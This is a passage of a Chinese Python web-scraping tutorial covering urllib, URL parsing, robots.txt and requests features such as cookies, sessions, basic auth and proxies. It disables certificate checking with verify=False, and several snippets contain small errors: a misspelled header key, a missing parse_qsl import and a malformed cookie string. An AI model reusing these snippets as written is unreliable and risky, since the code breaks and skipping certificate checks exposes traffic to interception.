class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request,error<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#定义不存在的路径，并且不带账户密码访问</span><br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912104854648.png" alt="image-20230912104854648"></p><p>HTTPError</p><p>用于处理HTTP请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request<br><br><span class="hljs-keyword">try</span>:<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> HTTPError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http error: &quot;</span>,e)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912105624185.png" alt="image-20230912105624185"></p><p>超时异常  —  URLError处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># url = &quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    <span class="hljs-comment"># headers = &#123;</span><br>    <span class="hljs-comment">#     &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;,</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># req = urllib.request.Request(url=url,headers=headers)</span><br>    <span class="hljs-comment"># response = urllib.request.urlopen(req)</span><br>    <span class="hljs-comment"># print(response.read().decode(&#x27;utf-8&#x27;))</span><br>    url = <span class="hljs-string">&quot;https://www.baidu.com&quot;</span><br>    <span class="hljs-comment">#设置超时时间为0.01 触发超时错误</span><br>    response = urllib.request.urlopen(url=url,timeout=<span class="hljs-number">0.01</span>)<br><br><span class="hljs-comment">#except HTTPError as e:</span><br>    <span class="hljs-comment">#print(&quot;http error: &quot;,e)</span><br><span class="hljs-keyword">except</span> URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e.reason,socket.timeout):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Time out!!&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="链接的组成和解析"><a href="#链接的组成和解析" class="headerlink" title="链接的组成和解析"></a>链接的组成和解析</h3><p><strong>urlparse:python标准库中的一个模块，解析和操作url</strong></p><ul><li><strong>标准url链接格式:</strong></li></ul><p>scheme:&#x2F;&#x2F;netloc&#x2F;path;params?query#fragment</p><p>scheme（协议） http or https<br>netloc（网络位置） host<br>path（路径）<br>params（携带的参数）<br>query（查询参数）<br>fragment（片段） 内部导航</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br><br>result = urlparse(url=url)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result),result)<br><br>结果：<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urllib.parse.ParseResult&#x27;</span>&gt; <br>ParseResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html&#x27;</span>, params=<span class="hljs-string">&#x27;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><strong>urlunparse:与urlparse相反，组合url</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse<br>data = [<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>]<br>url = urlunparse(data)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>http://www.baidu.com/index.html;user?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urlsplit:与urlparse类似，用于将url参数分割成不同的部分，但不会解析查询参数和片段部分</strong></li></ul><p>返回的是一个元组  可以用索引取值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit<br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br>parts = urlsplit(url)<br><span class="hljs-built_in">print</span>(parts)<br><span class="hljs-built_in">print</span>(parts.scheme)<br><span class="hljs-built_in">print</span>(parts[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(parts.netloc)<br><span class="hljs-built_in">print</span>(parts.path)<br><span class="hljs-comment"># print(parts.params)</span><br><span class="hljs-built_in">print</span>(parts.query)<br><span class="hljs-built_in">print</span>(parts.fragment)<br><br>结果：<br>SplitResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br>http<br>http<br>www.baidu.com<br>/index.html;user<br><span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><br>comment<br><br><span class="hljs-comment">#urlunsplit  组合</span><br>data = (<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>)<br><span class="hljs-built_in">print</span>(urlunsplit(data))<br>结果：<br>http://www.baidu.com/index.html?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urljoin：urljoin()是连接一个基本URL和一个可能的相对URL来形成一个绝对URL</strong></li></ul><p>参数：</p><p>base  基本url，通常是一个绝对的url</p><p>url  这个是相对的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin<br>base_url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>relative_url = <span class="hljs-string">&#x27;path/to/xxx&#x27;</span><br><br>url = urljoin(base=base_url,url=relative_url)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>https://www.baidu.com/path/to/xxx<br></code></pre></td></tr></table></figure><p>注意：base_url 提供了三项内容 scheme、netloc 和 path。如果这 3 项在新的链接里不存在，就予以补充；如果新的链接存在，就使用新的链接的部分。而 base_url 中的 params、query 和 fragment 是不起作用的。</p><ul><li><strong>parse_qs</strong></li></ul><p>get参数的序列化</p><ul><li><strong>parse_qsl</strong></li></ul><p>将参数转为元组组成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin,parse_qs <br>query = <span class="hljs-string">&#x27;name=handsomer1&amp;age=18&#x27;</span><br><span class="hljs-built_in">print</span>(parse_qs(query))<br><span class="hljs-built_in">print</span>(parse_qsl(query))<br><br>结果：<br>&#123;<span class="hljs-string">&#x27;name&#x27;</span>: [<span class="hljs-string">&#x27;handsomer1&#x27;</span>], <span class="hljs-string">&#x27;age&#x27;</span>: [<span class="hljs-string">&#x27;18&#x27;</span>]&#125;<br>[(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;handsomer1&#x27;</span>), (<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>)]<br></code></pre></td></tr></table></figure><ul><li><strong>quote</strong></li></ul><p>url编码</p><ul><li><strong>unquote</strong></li></ul><p>url解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote, unquote<br>keyword = <span class="hljs-string">&quot;卢本伟&quot;</span><br>url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span>+quote(keyword)<br><span class="hljs-built_in">print</span>(url)<br>url_1 = unquote(url)<br><span class="hljs-built_in">print</span>(url_1)<br><br>结果：<br>https://www.baidu.com/s?wd=%E5%8D%A2%E6%9C%AC%E4%BC%9F<br>https://www.baidu.com/s?wd=卢本伟<br></code></pre></td></tr></table></figure><ul><li><strong>robotparser模块</strong></li></ul><p>用于解析robots.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.robotparser <span class="hljs-keyword">import</span> RobotFileParser<br><br><span class="hljs-comment">#创建一个RobotFileParser对象用于解析robots.txt</span><br>robot_parser = RobotFileParser()<br><span class="hljs-comment">#robot_parser.set_url(&#x27;https://www.baidu.com/robots.txt&#x27;)</span><br>robot_parser.set_url(<span class="hljs-string">&#x27;https://www.zhihu.com/robots.txt&#x27;</span>)<br><span class="hljs-comment">#读取并解析robots.txt</span><br>robot_parser.read()<br><br><span class="hljs-comment">#检查是否可以爬取特定的url</span><br>user_agent = <span class="hljs-string">&quot;BaiduSpider&quot;</span><br><span class="hljs-comment">#check_url = &#x27;https://www.baidu.com/baidu&#x27;</span><br>check_url = <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span><br><br><span class="hljs-comment">#can_fetch 确定指定的用户代理是否允许访问网页</span><br><span class="hljs-keyword">if</span> robot_parser.can_fetch(user_agent,check_url):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可以爬取此url&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能爬取此url&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><h3 id="普通请求-get-post-put-…"><a href="#普通请求-get-post-put-…" class="headerlink" title="普通请求 get post put …"></a>普通请求 get post put …</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#get</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#添加参数的get请求</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#     &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#     &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#post</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#      &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#      &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment"># r = requests.put(&#x27;http://httpbin.org/put&#x27;)</span><br><span class="hljs-comment"># r = requests.delete(&#x27;http://httpbin.org/delete&#x27;)</span><br><span class="hljs-comment"># r = requests.head(&#x27;http://httpbin.org/head&#x27;)</span><br><span class="hljs-comment"># r = requests.options(&#x27;http://httpbin.org/options&#x27;)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Usrt-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="高级用法（文件上传-requestcookiejar-session等）"><a href="#高级用法（文件上传-requestcookiejar-session等）" class="headerlink" title="高级用法（文件上传 requestcookiejar session等）"></a>高级用法（文件上传 requestcookiejar session等）</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#上传图片文件</span><br>file = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;favicon.ico&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br>r = requests.post(url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://www.zhihu.com&#x27;</span><br><span class="hljs-comment"># r = requests.get(url=url)</span><br><span class="hljs-comment"># print(r.cookies)</span><br><span class="hljs-comment"># for k,v in r.cookies.items():</span><br><span class="hljs-comment">#     print(k + &quot;=&quot; + v)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:xxx<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">    &#x27;</span>User-Agent<span class="hljs-string">&#x27;:&#x27;</span>Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">116.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">r = requests.get(url=url,headers=headers)</span><br><span class="hljs-string">with open(&#x27;</span><span class="hljs-number">1.</span>html<span class="hljs-string">&#x27;,&#x27;</span>w<span class="hljs-string">b&#x27;) as f:</span><br><span class="hljs-string">    f.write(r.text.encode(&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;))</span><br><span class="hljs-string">    </span><br><span class="hljs-string">print(r.cookies)</span><br><span class="hljs-string">for k,v in r.cookies.items():</span><br><span class="hljs-string">    print(k + &quot;=&quot; + v)</span><br></code></pre></td></tr></table></figure><h4 id="使用cookiejar保存cookie，并携带cookie访问网页"><a href="#使用cookiejar保存cookie，并携带cookie访问网页" class="headerlink" title="使用cookiejar保存cookie，并携带cookie访问网页"></a>使用cookiejar保存cookie，并携带cookie访问网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests.cookies<br><br>Cookie = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-comment">#创建一个空的RequestsCookieJar来保存cookie</span><br>jar = requests.cookies.RequestsCookieJar()<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br><br><span class="hljs-comment">#遍历分割cookies字符串，将每一个cookie的键值对添加到cookiejar中</span><br><span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> Cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>):<br>    key,value = cookie.split(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-number">1</span>)<br>    jar.<span class="hljs-built_in">set</span>(key,value)<br><br><span class="hljs-comment">#发送请求并且附带cookies和header</span><br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,cookies=jar,headers=headers)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.html&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(r.text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>r1 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><span class="hljs-built_in">print</span>(r1.text)<br>r2 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r2.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153149172.png" alt="image-20230912153149172"></p><p>存在的问题：每次请求独立 第一次设置了cookie之后第二次请求不存在了</p><p>使用session：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.创建一个session</span><br>s = requests.Session()<br><br><span class="hljs-comment">#2.向网站发送get并且设置cookie</span><br>s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><br><span class="hljs-comment">#3.再次发送请求 获取会话中的cookie</span><br>r = s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153518207.png" alt="image-20230912153518207"></p><h4 id="ssl证书校验"><a href="#ssl证书校验" class="headerlink" title="ssl证书校验"></a>ssl证书校验</h4><p>测试网址：<a href="https://ssr2.scrape.center/">https://ssr2.scrape.center/</a></p><img src="/img/image-20230912153814371.png" alt="image-20230912153814371" style="zoom:67%;" /><p>缺少证书，需要自己点继续前往的情况</p><p>直接请求 报错：</p><p><img src="/img/image-20230912154002903.png" alt="image-20230912154002903"></p><p>添加verify&#x3D;False即可绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912154243221.png" alt="image-20230912154243221"></p><h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p>timeout参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,timeout=<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><h4 id="身份认证（httpbasicAuth）"><a href="#身份认证（httpbasicAuth）" class="headerlink" title="身份认证（httpbasicAuth）"></a>身份认证（httpbasicAuth）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><span class="hljs-comment">#使用HTTPBasicAuth添加用户密码</span><br>r = requests.get(<span class="hljs-string">&#x27;https://ssr3.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,auth=HTTPBasicAuth(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> weakref <span class="hljs-keyword">import</span> proxy<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#http代理</span><br>proxy_list = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span>,<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span><br>&#125;<br><br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxy_list)<br><br><span class="hljs-comment">#socks代理</span><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;sock5:username:password@host:port&#x27;</span><br>&#125;<br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxies)<br></code></pre></td></tr></table></figure><h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><p>httpx库  爬取使用http2.0的网站</p><p><a 